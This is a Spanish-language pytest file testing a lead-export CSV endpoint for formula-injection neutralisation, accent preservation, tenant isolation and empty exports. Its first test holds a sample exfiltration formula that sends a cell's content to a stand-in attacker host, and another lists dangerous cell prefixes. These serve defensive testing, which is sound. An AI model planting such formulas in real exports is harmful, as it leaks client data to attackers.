"""
C. `GET /leads/export/csv` — el archivo que el cliente abre en Excel.

Por qué este endpoint tiene pruebas de seguridad y no sólo de formato: el
contenido de `form_data` lo escribió quien llenó el formulario público de
Meta —cualquiera en Internet, sin autenticarse— y termina siendo el texto
crudo de una celda en la máquina de un cliente de VaoVao. La cadena
"atacante anónimo → celda ejecutada en la computadora del cliente" es
completa y no pasa por ninguna revisión humana.

Las pruebas parsean la salida con el módulo `csv` en vez de buscar
subcadenas en los bytes: un `assert "José" in body` pasaría igual si el
archivo estuviera roto como CSV (una comilla sin cerrar, una fila partida),
que es justo el fallo que "sigue siendo un archivo válido" pretende
descartar.
"""
from __future__ import annotations

import csv
import io

import pytest
from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.models import Lead

EXPORT = "/leads/export/csv"

# Las siete columnas fijas de `leads_csv_exporter`, en orden. Las de
# `form_data` se intercalan entre `campaign_name` y `status`.
COLUMNAS_FIJAS = (
    "leadgen_id",
    "form_id",
    "campaign_name",
    "status",
    "assigned_to",
    "notes",
    "received_at",
)


def _count(db: Session, model, *conditions) -> int:
    return db.scalar(select(func.count()).select_from(model).where(*conditions)) or 0


def _parse(response) -> list[list[str]]:
    """El CSV exportado, leído de vuelta como filas.

    `utf-8-sig` porque el exportador escribe BOM a propósito (para que Excel
    en Windows no muestre mojibake); decodificar con `utf-8` a secas dejaría
    el BOM pegado al primer encabezado y las comparaciones fallarían por una
    razón que no es la que la prueba investiga.
    """
    texto = response.content.decode("utf-8-sig")
    return list(csv.reader(io.StringIO(texto, newline="")))


def _celda(filas: list[list[str]], columna: str) -> str:
    """El valor de `columna` en la única fila de datos del archivo."""
    encabezado, *datos = filas
    assert len(datos) == 1, f"se esperaba una sola fila de datos, hay {len(datos)}"
    assert columna in encabezado, f"{columna!r} no está en {encabezado!r}"
    return datos[0][encabezado.index(columna)]


# ═════════════════════════════════════════════════════════════════
#  1. Inyección de fórmulas (OWASP CSV Injection)
# ═════════════════════════════════════════════════════════════════
def test_una_formula_en_form_data_se_exporta_como_texto_y_no_como_formula(
    client, login, factory, tenant_a
):
    """El ataque real: exfiltrar celdas del archivo al abrirlo.

    `=HYPERLINK("http://evil.tld?d="&A1,"clic")` en un `full_name` convierte
    la hoja del cliente en un enlace que, al hacer clic, manda el contenido
    de otra celda al servidor del atacante. Quien lo escribió sólo tuvo que
    llenar un formulario público de Meta.

    La garantía que se afirma NO es "Excel esconde la comilla" (eso depende
    de la hoja de cálculo): es que la celda deje de empezar con `=`. Se
    afirman las dos cosas —el prefijo puesto y el valor íntegro detrás— para
    que ni quitar el saneo ni mutilar el dato pasen.
    """
    ataque = '=HYPERLINK("http://evil.tld?d="&A1,"clic")'
    factory.lead(tenant_a.client, form_data={"full_name": ataque})
    login(tenant_a.owner)

    response = client.get(EXPORT)

    assert response.status_code == 200
    valor = _celda(_parse(response), "full_name")
    assert not valor.startswith("="), "la celda sigue siendo una fórmula"
    assert valor == "'" + ataque


@pytest.mark.parametrize(
    "peligroso",
    [
        "=1+1",
        "+502 5541 2290",
        "-500",
        "@SUM(A1:A9)",
        "\tcolumna corrida",
        "\rfila corrida",
    ],
    ids=["igual", "mas", "menos", "arroba", "tab", "retorno"],
)
def test_todo_arranque_peligroso_de_celda_queda_neutralizado(
    client, login, factory, tenant_a, peligroso
):
    """Los seis caracteres de `_FORMULA_PREFIXES`, no sólo el `=` obvio.

    `+` y `-` importan tanto como `=`: `+HYPERLINK(...)` se evalúa igual en
    Excel, y son además los que aparecen en datos legítimos (un teléfono con
    código de país). El tab y el retorno de carro no ejecutan nada pero
    corren la fila, que es cómo un CSV deja de ser legible.

    El valor original se conserva completo detrás de la comilla: la
    mitigación no puede mutilar el dato (un teléfono sin su `+` deja de ser
    el mismo teléfono).
    """
    factory.lead(tenant_a.client, form_data={"campo": peligroso})
    login(tenant_a.owner)

    response = client.get(EXPORT)

    assert response.status_code == 200
    valor = _celda(_parse(response), "campo")
    assert valor == "'" + peligroso
    assert valor[1:] == peligroso


def test_un_valor_inofensivo_no_se_le_agrega_nada(client, login, factory, tenant_a):
    """El contrapeso: sin esto, "sanear" podría ser "prefijar todo" y nadie lo notaría.

    Si el saneo se aplicara a ciegas, el cliente vería una comilla delante de
    cada nombre en las hojas de cálculo que no la esconden. La prueba de
    arriba pasaría igual; sólo ésta lo detecta.
    """
    factory.lead(tenant_a.client, form_data={"full_name": "Ana Pérez"})
    login(tenant_a.owner)

    response = client.get(EXPORT)

    assert response.status_code == 200
    assert _celda(_parse(response), "full_name") == "Ana Pérez"


# ═════════════════════════════════════════════════════════════════
#  2. Los datos son en español: los acentos tienen que sobrevivir
# ═════════════════════════════════════════════════════════════════
def test_los_acentos_y_la_enye_sobreviven_la_ida_y_vuelta(
    client, login, factory, tenant_a
):
    """Un archivo con "JosÃ© MuÃ±oz" es un entregable inservible para el cliente.

    Se parsea la propia salida con el módulo `csv` y se compara contra el
    valor original, en vez de buscar la subcadena en los bytes: así la prueba
    cubre a la vez la codificación (`utf-8-sig`) y que el archivo siga siendo
    un CSV bien formado.
    """
    valores = {
        "nombre": "José Muñoz Peñaloza",
        "pregunta": "¿Cuál es tu presupuesto aproximado?",
        "ciudad": "Sacatepéquez",
    }
    factory.lead(tenant_a.client, form_data=valores)
    login(tenant_a.owner)

    response = client.get(EXPORT)

    assert response.status_code == 200
    filas = _parse(response)
    for columna, esperado in valores.items():
        assert _celda(filas, columna) == esperado


# ═════════════════════════════════════════════════════════════════
#  3. La exportación es de UNA organización
# ═════════════════════════════════════════════════════════════════
def test_la_exportacion_solo_contiene_leads_de_la_organizacion_de_quien_llama(
    client, login, factory, tenant_a, tenant_b, db
):
    """Un CSV que cruce tenants entrega la cartera de una agencia a otra.

    Es la fuga más grave posible del módulo: no es una fila de más en una
    pantalla, es un archivo descargado que ya salió del sistema y no se puede
    recuperar.
    """
    mio = factory.lead(tenant_a.client, leadgen_id="lead-de-la-agencia-a")
    ajeno = factory.lead(tenant_b.client, leadgen_id="lead-de-la-agencia-b")
    # Precondición: los dos leads existen de verdad. Sin esto, un exportador
    # que devolviera siempre un archivo vacío pasaría la prueba.
    assert _count(db, Lead) == 2
    assert mio.org_id != ajeno.org_id

    login(tenant_a.owner)
    response = client.get(EXPORT)

    assert response.status_code == 200
    filas = _parse(response)
    encabezado, *datos = filas
    leadgen_ids = [fila[encabezado.index("leadgen_id")] for fila in datos]
    assert leadgen_ids == ["lead-de-la-agencia-a"]
    assert "lead-de-la-agencia-b" not in response.content.decode("utf-8-sig")


# ═════════════════════════════════════════════════════════════════
#  4. Cero leads es un caso legítimo, no un archivo roto
# ═════════════════════════════════════════════════════════════════
def test_una_exportacion_sin_leads_sigue_siendo_un_csv_valido(
    client, login, tenant_a, db
):
    """Un cliente sin actividad en el período no puede recibir un archivo roto.

    El plan original devolvía el texto `No leads to export`, que Excel abre
    como una sola celda o rechaza. Lo correcto es un CSV con sólo el
    encabezado: el cliente ve una hoja vacía con las columnas esperadas, que
    se lee como "no hubo leads" y no como "esto se rompió".
    """
    assert _count(db, Lead) == 0
    login(tenant_a.owner)

    response = client.get(EXPORT)

    assert response.status_code == 200
    filas = _parse(response)
    assert len(filas) == 1, "un CSV vacío tiene encabezado y nada más"
    # Sin leads no hay de dónde sacar columnas de `form_data`: quedan las fijas.
    assert tuple(filas[0]) == COLUMNAS_FIJAS
